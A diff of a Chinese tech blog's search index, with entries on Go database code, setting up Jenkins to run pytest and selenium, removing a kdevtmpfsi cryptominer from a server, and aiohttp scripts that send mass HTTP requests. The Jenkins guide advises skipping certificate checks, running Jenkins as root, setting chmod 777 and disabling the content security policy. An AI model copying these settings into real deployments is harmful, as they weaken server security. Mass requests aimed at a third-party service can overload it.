+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/main.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/ggorm&quot;</span></span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/tmysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	tmysql.InitDb()</span><br><span class="line">	tmysql.Select()</span><br><span class="line">	tmysql.Insert()</span><br><span class="line">	tmysql.Update()</span><br><span class="line">	tmysql.Delete()</span><br><span class="line"></span><br><span class="line">	ggorm.InitDb()</span><br><span class="line">	ggorm.Insert()</span><br><span class="line">	ggorm.Update()</span><br><span class="line">	ggorm.Detele()</span><br><span class="line">	ggorm.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="来自"><a href="#来自" class="headerlink" title="来自"></a>来自</h2><ul>
+<li><p><a href="https://gorm.io/zh_CN/docs/index.html">gorm</a></p>
+</li>
+<li><p><a href="https://www.topgoer.com/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/go%E6%93%8D%E4%BD%9Cmysql/">go操作mysql</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>go</category>
+      </categories>
+      <tags>
         <tag>go</tag>
       </tags>
   </entry>
@@ -8286,118 +8286,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Jenkins运行pytest selenium</title>
-    <url>/aposts/6ef225f8/</url>
-    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
-<li><a href="/aposts/d8b0934a">这篇文章</a>说明了如何搭建分布式测试流程，这次主要介绍把代码放到服务器上，用<code>Jenkins</code>来运行</li>
-<li>本次服务器为某云服务器，centos7 64</li>
-</ul>
-<h2 id="Jenkins-环境搭建"><a href="#Jenkins-环境搭建" class="headerlink" title="Jenkins 环境搭建"></a>Jenkins 环境搭建</h2><ul>
-<li>下载镜像仓库</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo --no-check-certificate</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>下载<code>Jenkins.io.key</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>yum下载安装依赖和jenkins</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line">yum install java-11-openjdk-devel  ##如果有装jdk8以上可跳过</span><br><span class="line">yum install jenkins</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>如果要修改端口，到这里修改不会生效的：<code>vim /etc/sysconfig/jenkins</code></p>
-</li>
-<li><p>正确的修改方式是在这个路径下</p>
-</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/jenkins.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改为想要的端口</span></span><br><span class="line">Environment=&quot;JENKINS_PORT=5444&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>修改好路径后，重新加载服务</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart jenkins</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>如何知道自己的路径？用下面的命令就能查到</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@VM-24-13-centos jenkins]# systemctl status jenkins</span><br><span class="line">● jenkins.service - Jenkins Continuous Integration Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/jenkins.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 二 2022-03-29 15:25:17 CST; 10min ago</span><br><span class="line"> Main PID: 23668 (java)</span><br><span class="line">    Tasks: 37</span><br><span class="line">   Memory: 269.3M</span><br><span class="line">   CGroup: /system.slice/jenkins.service</span><br><span class="line">           └─23668 /usr/bin/java -Djava.awt.headless=true -jar /usr/share/java/jenkins.war --webroot=%C/jenkins/war --httpPort=544..</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>用浏览器打开访问地址</li>
-</ul>
-<p><img src="/aposts/6ef225f8/image-20220329153925727.png" alt="image-20220329153925727"></p>
-<ul>
-<li><p>页面会出现类似于<code>Please wait while Jenkins is getting ready to work ...</code>，等待一会儿后，就自动会打开如上面的输入密码的界面，</p>
-<ul>
-<li><strong>这里我没有实践</strong>。有的博客说一直停留在无法please wait界面，可以要修改配置文件需要进入<code>/var/lib/jenkins/</code>目录（通过rpm方式安装的jenkins是这个目录）下<code>hudson.model.UpdateCenter.xml</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将&lt;url&gt;https://updates.jenkins.io/update-center.json&lt;/url&gt;</span><br><span class="line">换成</span><br><span class="line">&lt;url&gt;http://mirror.xmission.com/jenkins/updates/update-center.json&lt;/url&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>检查jenkins配置配置文件，将执行用户改成<code>root</code>,不然后面可能出现执行shell没有权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/jenkins # 编辑文件</span><br><span class="line">JENKINS_USER=&quot;root&quot; # 改成root</span><br><span class="line"></span><br><span class="line">service jenkins restart</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>找到密码文件后，拷贝输入到浏览器中登录成功</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /var/lib/jenkins/secrets/initialAdminPassword # 得到密码</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>先默认不选择插件</li>
-</ul>
-<p><img src="/aposts/6ef225f8/image-20220329155214241.png" alt="image-20220329155214241"></p>
-<p><img src="/aposts/6ef225f8/image-20220329155307321.png" alt="image-20220329155307321"></p>
-<ul>
-<li><p>把测试代码上传到服务器，也可以采用使用Jenkins拉取git的方式，中途测试中<code>jenkins</code>出现无权限问题，可以修改目录权限：<code>chmod -R 777 auto_web_ui/</code></p>
-</li>
-<li><p><code>HTML Publisher</code> 插件可以展示html报告，<code>jenkins</code>本次不安装，用自带的<code>Achive the artifacts</code></p>
-</li>
-<li><p>然后新建一个<code>job</code>，执行shell里面配置生成<code>pytest</code>命令，运行完成后在当前目录下生成一个<code>report.html</code>报告，第一行的<code>#!/bin/bash</code>和最后一行的<code>echo 0</code> 是为了解决构建失败的问题</p>
-</li>
-</ul>
-<p><img src="/aposts/6ef225f8/image-20220330100642967.png" alt="image-20220330100642967"></p>
-<ul>
-<li>构建后操作，使用<code>Achive the artifacts</code>即可，测试报告的路径记得要对应</li>
-</ul>
-<p><img src="/aposts/6ef225f8/image-20220330100856448.png" alt="image-20220330100856448"></p>
-<h3 id="构建运行"><a href="#构建运行" class="headerlink" title="构建运行"></a>构建运行</h3><p><img src="/aposts/6ef225f8/image-20220330101017680.png" alt="image-20220330101017680"></p>
-<p>查看html报告，样式丢失了</p>
-<p><img src="/aposts/6ef225f8/image-20220329180732531.png" alt="image-20220329180732531"></p>
-<ul>
-<li>在jenkins-&gt;系统管理-&gt;脚本命令行，输入以下命令执行就可以了</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.setProperty(&quot;hudson.model.DirectoryBrowserSupport.CSP&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/6ef225f8/image-20220329180858248.png" alt="image-20220329180858248"></p>
-<ul>
-<li>打开html界面后，刷新</li>
-</ul>
-<p><img src="/aposts/6ef225f8/image-20220330101618078.png" alt="image-20220330101618078"></p>
-<ul>
-<li><p>但是这样重启后会失效，永久解决方案是安装插件：<code>Startup Trigger</code> 和 <code>Groovy</code> 插件</p>
-</li>
-<li><p>在Job配置页面， 在构建触发器的时候勾选：<code>Build when job nodes start</code></p>
-</li>
-</ul>
-<p><img src="/aposts/6ef225f8/image-20220330102008961.png" alt="image-20220330102008961"></p>
-<ul>
-<li>在Job配置页面，增加构建步骤<code>Execute system Groovy script</code>，脚本输入：<code>System.setProperty(&quot;hudson.model.DirectoryBrowserSupport.CSP&quot;,&quot;&quot;)</code></li>
-</ul>
-<p><img src="/aposts/6ef225f8/image-20220330102150623.png" alt="image-20220330102150623"></p>
-]]></content>
-      <categories>
-        <category>Jenkins</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>自动化测试</tag>
-        <tag>Jenkins</tag>
-        <tag>selenium</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>jdbc练习</title>
     <url>/aposts/d2d01856/</url>
     <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
@@ -8515,6 +8403,118 @@
       </categories>
       <tags>
         <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jenkins运行pytest selenium</title>
+    <url>/aposts/6ef225f8/</url>
+    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
+<li><a href="/aposts/d8b0934a">这篇文章</a>说明了如何搭建分布式测试流程，这次主要介绍把代码放到服务器上，用<code>Jenkins</code>来运行</li>
+<li>本次服务器为某云服务器，centos7 64</li>
+</ul>
+<h2 id="Jenkins-环境搭建"><a href="#Jenkins-环境搭建" class="headerlink" title="Jenkins 环境搭建"></a>Jenkins 环境搭建</h2><ul>
+<li>下载镜像仓库</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo --no-check-certificate</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>下载<code>Jenkins.io.key</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>yum下载安装依赖和jenkins</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line">yum install java-11-openjdk-devel  ##如果有装jdk8以上可跳过</span><br><span class="line">yum install jenkins</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>如果要修改端口，到这里修改不会生效的：<code>vim /etc/sysconfig/jenkins</code></p>
+</li>
+<li><p>正确的修改方式是在这个路径下</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/jenkins.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改为想要的端口</span></span><br><span class="line">Environment=&quot;JENKINS_PORT=5444&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改好路径后，重新加载服务</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart jenkins</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如何知道自己的路径？用下面的命令就能查到</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@VM-24-13-centos jenkins]# systemctl status jenkins</span><br><span class="line">● jenkins.service - Jenkins Continuous Integration Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/jenkins.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 二 2022-03-29 15:25:17 CST; 10min ago</span><br><span class="line"> Main PID: 23668 (java)</span><br><span class="line">    Tasks: 37</span><br><span class="line">   Memory: 269.3M</span><br><span class="line">   CGroup: /system.slice/jenkins.service</span><br><span class="line">           └─23668 /usr/bin/java -Djava.awt.headless=true -jar /usr/share/java/jenkins.war --webroot=%C/jenkins/war --httpPort=544..</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用浏览器打开访问地址</li>
+</ul>
+<p><img src="/aposts/6ef225f8/image-20220329153925727.png" alt="image-20220329153925727"></p>
+<ul>
+<li><p>页面会出现类似于<code>Please wait while Jenkins is getting ready to work ...</code>，等待一会儿后，就自动会打开如上面的输入密码的界面，</p>
+<ul>
+<li><strong>这里我没有实践</strong>。有的博客说一直停留在无法please wait界面，可以要修改配置文件需要进入<code>/var/lib/jenkins/</code>目录（通过rpm方式安装的jenkins是这个目录）下<code>hudson.model.UpdateCenter.xml</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将&lt;url&gt;https://updates.jenkins.io/update-center.json&lt;/url&gt;</span><br><span class="line">换成</span><br><span class="line">&lt;url&gt;http://mirror.xmission.com/jenkins/updates/update-center.json&lt;/url&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>检查jenkins配置配置文件，将执行用户改成<code>root</code>,不然后面可能出现执行shell没有权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/jenkins # 编辑文件</span><br><span class="line">JENKINS_USER=&quot;root&quot; # 改成root</span><br><span class="line"></span><br><span class="line">service jenkins restart</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到密码文件后，拷贝输入到浏览器中登录成功</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /var/lib/jenkins/secrets/initialAdminPassword # 得到密码</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>先默认不选择插件</li>
+</ul>
+<p><img src="/aposts/6ef225f8/image-20220329155214241.png" alt="image-20220329155214241"></p>
+<p><img src="/aposts/6ef225f8/image-20220329155307321.png" alt="image-20220329155307321"></p>
+<ul>
+<li><p>把测试代码上传到服务器，也可以采用使用Jenkins拉取git的方式，中途测试中<code>jenkins</code>出现无权限问题，可以修改目录权限：<code>chmod -R 777 auto_web_ui/</code></p>
+</li>
+<li><p><code>HTML Publisher</code> 插件可以展示html报告，<code>jenkins</code>本次不安装，用自带的<code>Achive the artifacts</code></p>
+</li>
+<li><p>然后新建一个<code>job</code>，执行shell里面配置生成<code>pytest</code>命令，运行完成后在当前目录下生成一个<code>report.html</code>报告，第一行的<code>#!/bin/bash</code>和最后一行的<code>echo 0</code> 是为了解决构建失败的问题</p>
+</li>
+</ul>
+<p><img src="/aposts/6ef225f8/image-20220330100642967.png" alt="image-20220330100642967"></p>
+<ul>
+<li>构建后操作，使用<code>Achive the artifacts</code>即可，测试报告的路径记得要对应</li>
+</ul>
+<p><img src="/aposts/6ef225f8/image-20220330100856448.png" alt="image-20220330100856448"></p>
+<h3 id="构建运行"><a href="#构建运行" class="headerlink" title="构建运行"></a>构建运行</h3><p><img src="/aposts/6ef225f8/image-20220330101017680.png" alt="image-20220330101017680"></p>
+<p>查看html报告，样式丢失了</p>
+<p><img src="/aposts/6ef225f8/image-20220329180732531.png" alt="image-20220329180732531"></p>
+<ul>
+<li>在jenkins-&gt;系统管理-&gt;脚本命令行，输入以下命令执行就可以了</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.setProperty(&quot;hudson.model.DirectoryBrowserSupport.CSP&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/6ef225f8/image-20220329180858248.png" alt="image-20220329180858248"></p>
+<ul>
+<li>打开html界面后，刷新</li>
+</ul>
+<p><img src="/aposts/6ef225f8/image-20220330101618078.png" alt="image-20220330101618078"></p>
+<ul>
+<li><p>但是这样重启后会失效，永久解决方案是安装插件：<code>Startup Trigger</code> 和 <code>Groovy</code> 插件</p>
+</li>
+<li><p>在Job配置页面， 在构建触发器的时候勾选：<code>Build when job nodes start</code></p>
+</li>
+</ul>
+<p><img src="/aposts/6ef225f8/image-20220330102008961.png" alt="image-20220330102008961"></p>
+<ul>
+<li>在Job配置页面，增加构建步骤<code>Execute system Groovy script</code>，脚本输入：<code>System.setProperty(&quot;hudson.model.DirectoryBrowserSupport.CSP&quot;,&quot;&quot;)</code></li>
+</ul>
+<p><img src="/aposts/6ef225f8/image-20220330102150623.png" alt="image-20220330102150623"></p>
+]]></content>
+      <categories>
+        <category>Jenkins</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>自动化测试</tag>
+        <tag>Jenkins</tag>
+        <tag>selenium</tag>
       </tags>
   </entry>
   <entry>
@@ -8808,56 +8808,6 @@
       <tags>
         <tag>jmeter</tag>
         <tag>性能测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kdevtmpfsi--服务器CPU占用高、内存占用高</title>
-    <url>/aposts/177838dd/</url>
-    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>这篇<a href="aposts/d4ea272f/">文章</a>，后续的结论说是服务器配置不够观点是错误的，经过排查发现是服务器中毒了，经过<code>top</code>排查到了是有个叫<code>kdevtmpfsi</code>的后台进程太大造成，搜了下相关资料刚好有人和我相同的问题，把解决方案就<a href="https://blog.csdn.net/m0_37282062/article/details/108645671">转载</a>了过来</p>
-<h2 id="中毒具体描述"><a href="#中毒具体描述" class="headerlink" title="中毒具体描述"></a>中毒具体描述</h2><ul>
-<li>某一天，我写完本地程序，准备部署到云服务器，然而我的<code>xshell</code>始终是连接不上服务器，或者是连接上反应非常慢，我怀疑阿里云对我的服务器动了什么了（实在是对不住，毕竟我也不知道还有这种事情），然后通过阿里云控制台，发现出现了CPU占用非常高，基本上就100%了，并且内存的占用也是非常高。通过登录服务器，具体查看，然后使用命令查看，确实正如控制台的监控系统所展示的那样。</li>
-</ul>
-<h2 id="命令以及过程"><a href="#命令以及过程" class="headerlink" title="命令以及过程"></a>命令以及过程</h2><ul>
-<li><p>查看cpu占用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看异常进程 <code>kdevtmpfsi</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep kdevtmpfsi</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>处理异常定时任务</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看定时任务，找出异常任务</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"># 删除一次任务</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li><p>查看和其相关联的进程</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status pid</span><br><span class="line"># pid 为kdevtmpfsi的进程号</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>杀掉进程(包括其守护进程，由上一步可以看出)，先杀守护进程，后杀挖矿进程</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>删除守护进程文件</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找守护进程相关文件</span><br><span class="line">find / -name kins*</span><br><span class="line"></span><br><span class="line"># 删除文件</span><br><span class="line">rm -rf path</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>删除挖矿程序文件</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找文件</span><br><span class="line">find / -name kdevtmpfsi*</span><br><span class="line"># 删除</span><br><span class="line">rm -rf path</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>centos</tag>
-        <tag>云服务器</tag>
       </tags>
   </entry>
   <entry>
@@ -9732,6 +9682,56 @@
       </tags>
   </entry>
   <entry>
+    <title>kdevtmpfsi--服务器CPU占用高、内存占用高</title>
+    <url>/aposts/177838dd/</url>
+    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>这篇<a href="aposts/d4ea272f/">文章</a>，后续的结论说是服务器配置不够观点是错误的，经过排查发现是服务器中毒了，经过<code>top</code>排查到了是有个叫<code>kdevtmpfsi</code>的后台进程太大造成，搜了下相关资料刚好有人和我相同的问题，把解决方案就<a href="https://blog.csdn.net/m0_37282062/article/details/108645671">转载</a>了过来</p>
+<h2 id="中毒具体描述"><a href="#中毒具体描述" class="headerlink" title="中毒具体描述"></a>中毒具体描述</h2><ul>
+<li>某一天，我写完本地程序，准备部署到云服务器，然而我的<code>xshell</code>始终是连接不上服务器，或者是连接上反应非常慢，我怀疑阿里云对我的服务器动了什么了（实在是对不住，毕竟我也不知道还有这种事情），然后通过阿里云控制台，发现出现了CPU占用非常高，基本上就100%了，并且内存的占用也是非常高。通过登录服务器，具体查看，然后使用命令查看，确实正如控制台的监控系统所展示的那样。</li>
+</ul>
+<h2 id="命令以及过程"><a href="#命令以及过程" class="headerlink" title="命令以及过程"></a>命令以及过程</h2><ul>
+<li><p>查看cpu占用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看异常进程 <code>kdevtmpfsi</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep kdevtmpfsi</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>处理异常定时任务</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看定时任务，找出异常任务</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"># 删除一次任务</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>查看和其相关联的进程</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status pid</span><br><span class="line"># pid 为kdevtmpfsi的进程号</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>杀掉进程(包括其守护进程，由上一步可以看出)，先杀守护进程，后杀挖矿进程</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>删除守护进程文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找守护进程相关文件</span><br><span class="line">find / -name kins*</span><br><span class="line"></span><br><span class="line"># 删除文件</span><br><span class="line">rm -rf path</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>删除挖矿程序文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找文件</span><br><span class="line">find / -name kdevtmpfsi*</span><br><span class="line"># 删除</span><br><span class="line">rm -rf path</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>centos</tag>
+        <tag>云服务器</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>leetcode-0724-寻找数组的中心下标</title>
     <url>/aposts/2bfb77a5/</url>
     <content><![CDATA[<h1 id="0724-寻找数组的中心下标"><a href="#0724-寻找数组的中心下标" class="headerlink" title="0724. 寻找数组的中心下标"></a>0724. 寻找数组的中心下标</h1><ul>
@@ -10129,32 +10129,6 @@
       </tags>
   </entry>
   <entry>
-    <title>py3-5-aiohttp-百万请求？</title>
-    <url>/aposts/8d7c7783/</url>
-    <content><![CDATA[<ul>
-<li><p>找到了一篇英文文章说的就是构造百万级别http请求</p>
-</li>
-<li><p><a href="http://pawelmhm.github.io/asyncio/python/aiohttp/2016/04/22/asyncio-aiohttp.html">http://pawelmhm.github.io/asyncio/python/aiohttp/2016/04/22/asyncio-aiohttp.html</a> </p>
-</li>
-<li><p>作者对各个请求给服务器造成的情况作出了详细的对比。我就偷个懒没有。。。</p>
-</li>
-<li><p>基于py3.5 3.4的语法请自行度娘</p>
-</li>
-</ul>
-<h2 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line"><span class="comment"># 　你使用async以及await关键字将函数异步化</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">await</span> response.read()</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">loop,  r</span>):</span><br><span class="line">    url = <span class="string">&quot;http://gc.ditu.aliyun.com/geocoding?a=苏州市&quot;</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        task = asyncio.ensure_future(fetch(url.<span class="built_in">format</span>(i)))</span><br><span class="line">        tasks.append(task)</span><br><span class="line"></span><br><span class="line">    responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line">    <span class="comment"># 注意asyncio.gather()的用法，它搜集所有的Future对象，然后等待他们返回。</span></span><br><span class="line">    <span class="comment"># print(json.loads(responses[0].decode()))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(responses))</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">future = asyncio.ensure_future(run(loop, <span class="number">800</span>))</span><br><span class="line">loop.run_until_complete(future)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<ul>
-<li>future &#x3D; asyncio.ensure_future(run(loop, 800)) 这里 构造1000个请求时，就报too many open files loop is not close 作者也遇到此问题，说是本机的socket 端口用光了？很是怀疑</li>
-</ul>
-<h2 id="例子二-asyncio-Semaphore解决报错问题"><a href="#例子二-asyncio-Semaphore解决报错问题" class="headerlink" title="例子二 asyncio.Semaphore解决报错问题"></a>例子二 asyncio.Semaphore解决报错问题</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">await</span> response.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">bound_fetch</span>(<span class="params">sem, url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> sem:</span><br><span class="line">        <span class="keyword">await</span> fetch(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">loop,  r</span>):</span><br><span class="line">    url = <span class="string">&quot;http://gc.ditu.aliyun.com/geocoding?a=苏州市&quot;</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="comment"># create instance of Semaphore</span></span><br><span class="line">    sem = asyncio.Semaphore(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        <span class="comment"># pass Semaphore to every GET request</span></span><br><span class="line">        task = asyncio.ensure_future(bound_fetch(sem, url.<span class="built_in">format</span>(i)))</span><br><span class="line">        tasks.append(task)</span><br><span class="line"></span><br><span class="line">    responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line">    <span class="built_in">print</span>(responses)</span><br><span class="line">number = <span class="number">100000</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"></span><br><span class="line">future = asyncio.ensure_future(run(loop, number))</span><br><span class="line">loop.run_until_complete(future)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>然而我用asyncio.Semaphore时，发现请求不成功，已经发了邮件给作者，没有回我。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pc自动化调研</title>
     <url>/aposts/5639d3cc/</url>
     <content><![CDATA[<h2 id="关于PC自动化"><a href="#关于PC自动化" class="headerlink" title="关于PC自动化"></a>关于PC自动化</h2><p>无论使用那种PC自动化工具，首先需要知道应用程序是<code>win32 API</code> 的 <code>backend</code> 为<code>「 win32 」</code>，还是<code>MS UI Automation</code> 的 <code>backend</code> 为<code>「 uia 」</code></p>
@@ -10473,9 +10447,26 @@
       </tags>
   </entry>
   <entry>
-    <title>python+asyncio发送请求</title>
-    <url>/aposts/aab677c5/</url>
